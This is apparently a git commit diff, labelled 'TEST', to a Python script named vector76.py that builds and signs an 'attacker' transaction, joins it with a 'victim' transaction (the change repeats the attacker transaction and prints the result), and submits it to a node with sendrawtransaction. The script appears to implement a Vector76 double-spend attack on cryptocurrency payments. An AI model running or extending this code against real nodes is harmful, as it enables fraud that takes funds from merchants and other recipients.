39dd1b5eba466fc22a86ebc2ae8519be6abe438b
h0tcatSub <n0ricatnohotmens@gmail.com>
2024-07-29 15:51:02 +0900

    TEST

--- src/vector76.py
+++ src/vector76.py
@@ -91,7 +91,8 @@ tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, key))
 print()
 print()
-tx_vector76 = f"{tx_attacker}{tx_victim}"
+tx_vector76 = f"{tx_attacker}{tx_victim}{tx_attacker}"
+print(tx_vector76)
 print("sending vector76 block Your Node...")
 result = rpc_node.sendrawtransaction(tx_vector76)
 print(result)
